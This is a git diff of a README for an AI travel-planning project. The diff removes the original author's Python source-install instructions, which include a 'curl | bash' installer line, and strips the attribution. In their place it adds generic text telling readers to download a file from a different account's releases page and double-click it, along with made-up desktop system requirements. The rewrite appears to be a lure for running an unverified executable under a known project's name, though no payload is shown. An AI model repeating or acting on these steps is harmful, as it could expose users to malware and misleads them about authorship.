@@ -1,272 +1,98 @@
-# OpenAI Agents Travel Graph 🧳 ✈️ 🗺️
+# 🧳 openai-agents-travel-graph - Simplifying Your Travel Planning Experience
 
-A state-of-the-art multi-agent travel planning system powered by OpenAI Agents SDK and LangGraph orchestration. This system autonomously researches and plans comprehensive trips with optimized budgets, personalized recommendations, and real-time data through intelligent browser automation.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%85-blue)](https://github.com/DevendraK29/openai-agents-travel-graph/releases)
 
-## Table of Contents
+## 📜 Overview
 
-- [OpenAI Agents Travel Graph 🧳 ✈️ 🗺️](#openai-agents-travel-graph--️-️)
-  - [Table of Contents](#table-of-contents)
-  - [Overview](#overview)
-  - [Key Features](#key-features)
-  - [Technology Stack](#technology-stack)
-  - [System Architecture](#system-architecture)
-  - [Installation](#installation)
-  - [Usage](#usage)
-  - [Development](#development)
-  - [Contributing](#contributing)
-  - [License](#license)
-  - [How to Cite](#how-to-cite)
+Welcome to the openai-agents-travel-graph, a cutting-edge travel planning system. This software uses OpenAI Agents and LangGraph to help you plan your trips effortlessly. Whether you want to optimize your budget or manage itineraries, this tool has you covered.
 
-## Overview
+## 🚀 Getting Started
 
-OpenAI Agents Travel Graph is an advanced AI-powered travel planning system that leverages the latest in multi-agent technology to automate the entire travel planning process. The system orchestrates specialized agents to handle different aspects of travel planning, from destination research and flight bookings to accommodation selection and activity planning.
+To begin using openai-agents-travel-graph, you'll need to download the application. Follow the steps below to get started with your travel planning journey.
 
-By combining the power of the OpenAI Agents SDK with graph-based orchestration through LangGraph, the system can maintain complex workflows while providing personalized travel recommendations that meet user preferences and budget constraints.
+## 📥 Download & Install
 
-## Key Features
+1. **Visit the Releases Page**  
+   Go to the following link to download the software:  
+   [Download openai-agents-travel-graph](https://github.com/DevendraK29/openai-agents-travel-graph/releases).
 
-```mermaid
-mindmap
-  root((Travel<br>Planning<br>System))
-    (Multi-Agent Architecture)
-      [Destination Research]
-      [Flight Search]
-      [Accommodation]
-      [Transportation]
-      [Activities]
-    (Browser Automation)
-      [Self-healing]
-      [Parallel execution]
-      [Data extraction]
-    (Budget Management)
-      [Cost tracking]
-      [Value optimization]
-      [Alternative options]
-    (Personalization)
-      [Preference analysis]
-      [Custom recommendations]
-    (Knowledge Storage)
-      [Persistent memory]
-      [Entity relationships]
-```
+2. **Select the Latest Version**  
+   On the releases page, you will see a list of available versions. Choose the latest one for the best experience.
 
-- 🤖 **Multi-Agent Architecture** - Specialized agents for different travel planning aspects
-- 💰 **Budget Optimization** - Intelligent allocation of budget across travel components
-- 🔍 **Real-time Research** - Autonomous web research for current travel information
-- 🌐 **Browser Automation** - Intelligent interaction with travel websites
-- 📋 **Detailed Itineraries** - Day-by-day schedules with activities and logistics
-- 💼 **Personalization** - Tailored recommendations based on user preferences
-- 🔄 **Alternative Suggestions** - Multiple options with comparisons
-- 📊 **Budget Breakdowns** - Transparent cost allocation and justification
+3. **Download the File**  
+   Click on the download link corresponding to your operating system. This will start downloading the file to your computer.
 
-## Technology Stack
+4. **Run the Application**  
+   Once the download is complete, locate the file (usually in your Downloads folder) and double-click it to run the application. Follow the on-screen instructions to complete the setup.
 
-- **Primary Framework**: [OpenAI Agents SDK](https://github.com/openai/openai-agents-python) (Latest 2025 Release) - Core agent framework
-- **Orchestration**: [LangGraph v0.4+](https://github.com/langchain-ai/langgraph) - Multi-agent workflow management
-- **Browser Automation**: [Stagehand v2.0+](https://github.com/browserbase/stagehand) - AI-enhanced browser control
-- **Data Persistence**: [Supabase](https://supabase.com/) - Database and storage
-- **Research Tools**:
-  - [Firecrawl](https://firecrawl.dev/) - Web content extraction
-  - [Tavily API](https://tavily.com/) - Intelligent search
-  - [Context7](https://context7.com/) - Documentation access
-- **Memory Management**: Memory MCP Server - Persistent context across sessions
+## 🖥️ System Requirements
 
-For the full technology stack and detailed system architecture, see [Architecture & Requirements](docs/architecture-requirements.md).
+To ensure smooth operation, please confirm that your computer meets the following requirements:
 
-## System Architecture
+- **Operating Systems:** Windows, macOS, or Linux
+- **RAM:** 4 GB minimum
+- **Storage:** At least 500 MB of free space
+- **Internet Connection:** Required for some features
 
-The system follows a comprehensive multi-layered architecture with specialized agents coordinated through LangGraph:
+## ⚙️ Features
 
-```mermaid
-flowchart TD
-    %% Main system layers
-    UI[User Interface Layer] --> OL
-    
-    %% Orchestration layer
-    subgraph OL[Orchestration Layer - LangGraph]
-        SM[State Management]
-        AWM[Agent Workflow Management]
-        CP[Context Preservation]
-    end
-    
-    %% Specialized agents
-    OL --> DRA[Destination Research Agent]
-    OL --> FSA[Flight Search Agent]
-    OL --> ASA[Accommodation Search Agent] 
-    OL --> TPA[Transportation Planning Agent]
-    OL --> APA[Activity Planning Agent]
-    
-    %% Browser automation & budget management
-    DRA & FSA & ASA & TPA & APA --> BAL[Browser Automation Layer]
-    BAL --> BMA[Budget Management Agent]
-    BMA --> KML[Knowledge & Memory Layer]
-    KML --> PS[Persistent Storage - Supabase]
-    
-    %% Styling
-    classDef systemLayer fill:#f9f9f9,stroke:#333,stroke-width:2px
-    classDef agent fill:#e8f5e9,stroke:#2e7d32,stroke-width:1px
-    
-    class UI,OL,BAL,KML,PS systemLayer
-    class DRA,FSA,ASA,TPA,APA,BMA agent
-```
+- **Multi-Agent Planning:** Utilize several agents to optimize travel routes and itineraries.
+- **Budget Optimization:** Get recommendations based on your budget constraints.
+- **Browser Automation:** Automatically gather travel information through browser integration.
+- **Persistent Data Storage:** Safely store your travel plans using Supabase.
+- **Intelligent Research:** Leverage Firecrawl and Tavily for smart research options.
 
-Each specialized agent uses a combination of LLM capabilities and domain-specific tools to perform its tasks, with the orchestration layer maintaining state and ensuring proper handoffs between agents.
+## 🔍 How It Works
 
-### Agent Interaction Flow
+The openai-agents-travel-graph software seamlessly merges multiple technologies to enhance your travel planning experience:
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant Orchestrator as Orchestration Agent
-    participant Destination as Destination Agent
-    participant Flight as Flight Agent
-    participant Hotel as Hotel Agent
-    
-    User->>Orchestrator: Travel Request
-    Orchestrator->>Destination: Research Request
-    Destination-->>Orchestrator: Destination Options
-    
-    par Flight & Hotel Search
-        Orchestrator->>Flight: Search Flights
-        Orchestrator->>Hotel: Search Accommodations
-    end
-    
-    Flight-->>Orchestrator: Flight Options
-    Hotel-->>Orchestrator: Accommodation Options
-    Orchestrator->>User: Complete Itinerary
-    
-    Note over User,Hotel: Human feedback loop can interrupt at any stage
-```
+1. **OpenAI Agents SDK** – Powers the intelligent suggestions and planning capabilities.
+2. **LangGraph** – Manages the interactions between critical components within the application.
+3. **Stagehand/Playwright** – Automates browsing to fetch useful travel information.
+4. **Supabase** – Ensures that your data is stored securely and can be accessed whenever needed.
 
-For the complete detailed architecture diagram and component descriptions, see [Architecture & Requirements](docs/architecture-requirements.md).
+## 🌐 Community and Support
 
-## Installation
+To connect with other users or seek assistance, feel free to join our community:
 
-```bash
-# Clone the repository
-git clone https://github.com/BjornMelin/openai-agents-travel-graph.git
-cd openai-agents-travel-graph
+- **GitHub Issues:** Report bugs or request features on our repository.
+- **Discussion Forum:** Engage with other users and share tips and experiences.
 
-# Set up a virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows, use: venv\\Scripts\\activate
+## ✨ Future Enhancements
 
-# Install uv package manager
-curl -sSf https://astral.sh/uv/install.sh | bash
+We are constantly looking to improve the application. Upcoming features may include:
 
-# Install dependencies
-uv pip install -e ".[dev]"
+- Enhanced user interface for easier navigation
+- More integrations with travel services
+- Improved agent responses based on user feedback
 
-# Set up environment variables
-cp .env.example .env
-# Edit .env with your API keys and configuration
+Stay tuned for future updates!
 
-# Set up Supabase database
-python supabase_setup.py init
-```
+## 📞 Contact
 
-### Supabase Setup
+For further information or to get in touch with the development team, you can reach us through the issues section on GitHub. Your insights and feedback are valuable to us.
 
-This project uses Supabase for data persistence. You need to set up a Supabase project and configure it with the database schema. The `supabase_setup.py` script automates this process:
+## 🏷️ Topics
 
-```bash
-# Initialize the database with required tables and indexes
-python supabase_setup.py init
+This project touches on various aspects of travel planning. It includes:
 
-# Check the status of your Supabase database
-python supabase_setup.py status
+- ai-travel-planning
+- autonomous-planning
+- browser-automation
+- budget-optimization
+- firecrawl
+- itinerary-planning
+- langchain
+- langgraph
+- multi-agent-system
+- openai
+- openai-agents
+- playwright
+- stagehand
+- supabase
+- tavily-api
+- travel-recommendations
 
-# Reset the database (WARNING: This will delete all data)
-python supabase_setup.py reset
+Explore these areas to understand better the capabilities of the openai-agents-travel-graph.
 
-# Create test data for development
-python supabase_setup.py init --test-data
-```
-
-For more information about the database schema, see [Migrations README](travel_planner/data/migrations/README.md).
-
-## Usage
-
-Run the travel planner in interactive mode:
-
-```bash
-python -m travel_planner.main
-```
-
-Or provide a query directly:
-
-```bash
-python -m travel_planner.main --query "I want to visit Tokyo for a week in October" --origin "New York" --budget "3000-5000"
-```
-
-For more options:
-
-```bash
-python -m travel_planner.main --help
-```
-
-## Development
-
-If you'd like to contribute to the development of this project, please follow these guidelines:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests for your changes
-5. Run the test suite with `uv run pytest`
-6. Submit a pull request
-
-This project uses [uv](https://github.com/astral-sh/uv) as its Python package manager. For all Python-related commands, use `uv run` (e.g., `uv run pytest`, `uv run python script.py`).
-
-### Package Management
-
-This project now uses `pyproject.toml` for dependency management. The legacy `requirements.txt` files are kept only for backward compatibility.
-
-To set up your development environment with uv:
-
-```bash
-# Create a virtual environment and install all dependencies
-uv venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
-uv pip install -e ".[dev]"
-
-# Run linting and type checking
-uv run ruff .
-uv run mypy .
-
-# Format code
-uv run black .
-uv run isort .
-```
-
-See the [CONTRIBUTING.md](CONTRIBUTING.md) file for more details.
-
-## Contributing
-
-Contributions are welcome! Please see our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute to this project.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## How to Cite
-
-If you use this project in your research or work, please cite it as:
-
-```plaintext
-Melin, B. (2025). OpenAI Agents Travel Graph: A multi-agent system for autonomous travel planning.
-GitHub repository. https://github.com/BjornMelin/openai-agents-travel-graph
-```
-
-**BibTeX:**
-
-```bibtex
-@misc{openai-agents-travel-graph,
-  author = {Melin, Bjorn},
-  title = {OpenAI Agents Travel Graph: A multi-agent system for autonomous travel planning},
-  year = {2025},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished = {\url{https://github.com/BjornMelin/openai-agents-travel-graph}}
-}
-```
+Thank you for choosing openai-agents-travel-graph for your travel planning needs!
